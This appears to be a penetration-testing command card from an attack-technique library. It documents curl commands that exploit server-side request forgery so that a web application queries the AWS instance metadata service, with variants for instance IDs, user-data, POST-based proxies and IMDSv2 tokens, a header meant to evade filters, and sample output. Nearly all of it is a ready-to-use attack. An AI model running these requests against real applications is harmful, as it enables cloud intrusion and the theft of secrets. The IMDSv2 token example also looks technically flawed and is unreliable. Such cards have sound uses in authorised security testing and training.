---
id: c9011d80-71ba-479b-898b-0d3eae257d03
name: curl-request-aws-metadata-via-ssrf
type: command
executor: bash
data: >-
  curl
  "https://vulnerable-app.com/api/fetch?url=http://169.254.169.254/latest/meta-data/instance-id"
  -H "User-Agent: Mozilla/5.0"
output: null
created_at: '2023-04-06T03:56:38.702390+00:00'
updated_at: '2023-04-10T20:23:59.543921+00:00'
platforms:
  - Linux
  - macOS
tags:
  - ssrf
  - aws
  - curl
verified: true
validated: true
---

# curl-request-aws-metadata-via-ssrf

## Command

```bash
curl "https://vulnerable-app.com/api/fetch?url=http://169.254.169.254/latest/meta-data/instance-id" -H "User-Agent: Mozilla/5.0"
```

## Description

This command uses curl to exploit an SSRF vulnerability by sending a request to a vulnerable web application's fetch endpoint, forcing it to query the AWS Instance Metadata Service for the instance ID. It is used in cloud penetration testing to retrieve internal metadata without direct access to the instance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `https://vulnerable-app.com/api/fetch` | The URL of the SSRF-vulnerable endpoint | Yes |
| `url=http://169.254.169.254/latest/meta-data/instance-id` | The SSRF payload targeting AWS metadata (adjust path for other data like /user-data/) | Yes |
| `-H "User-Agent: Mozilla/5.0"` | Sets a browser-like User-Agent to bypass simple filters | No |

## Examples

### Basic Usage

```bash
curl "https://target-app.com/fetch?url=http://169.254.169.254/latest/meta-data/"
```
Retrieves full metadata directory listing.

### Advanced Usage

```bash
curl -X POST "https://target-app.com/api/proxy" -d "redirect=http://169.254.169.254/latest/user-data/" -H "Content-Type: application/x-www-form-urlencoded"
```
For POST-based SSRF, targeting user data.

### With Token for IMDSv2

First obtain token:
```bash
curl -X PUT "https://target-app.com/fetch?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
```
Then use token in subsequent requests.

## Expected Output

Successful execution returns the metadata content echoed by the application, e.g.:
```
i-1234567890abcdef0
```
Or for broader queries:
```
ami-launch-index
local-hostname
local-ipv4
...
```
Errors may include 403 (IMDSv2 required) or application-specific messages if blocked.

## Related

- [[Related Procedure: Exploit-SSRF-to-Retrieve-AWS-Instance-Metadata]]
